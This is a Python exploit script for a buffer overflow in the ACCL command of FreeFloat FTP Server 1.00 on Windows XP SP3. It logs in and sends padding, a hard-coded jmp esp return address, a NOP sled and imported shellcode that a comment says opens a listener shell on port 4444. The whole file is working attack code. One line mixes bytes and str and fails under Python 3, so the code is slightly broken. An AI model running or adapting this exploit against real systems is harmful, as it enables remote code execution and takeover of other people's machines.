#!/usr/bin/python
#
#[+]Exploit Title: FreeFloat FTP Server ACCL Buffer Overflow Exploit
#[+]Date: 19\06\2011
#[+]Author: mortis
#[+]Software Link: http://www.freefloat.com/software/freefloatftpserver.zip
#[+]Version: 1.00
#[+]Tested On: Windows XP SP3 English
#[+]CVE: N/A
#

from time import sleep
from payload import buf
import socket
import struct
import os
def shell_attack(target_machine, target_port):

	#open listener shell on port 4444

	host = target_machine
	port = target_port

	padding = b"A"*246
	sled = b"\x90"*20
	jmpesp = struct.pack(b'<L',0x7C874413) #jmp esp winxp3 
	 
	sploit = padding + jmpesp + sled + buf
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((host,port))
	s.recv(1024)
	s.send(b"USER test\r\n")
	s.recv(1024)
	s.send(b"PASS test\r\n")
	s.recv(1024)
	s.send(b"ACCL "+sploit+"\r\n")
	
	s.close()


		
		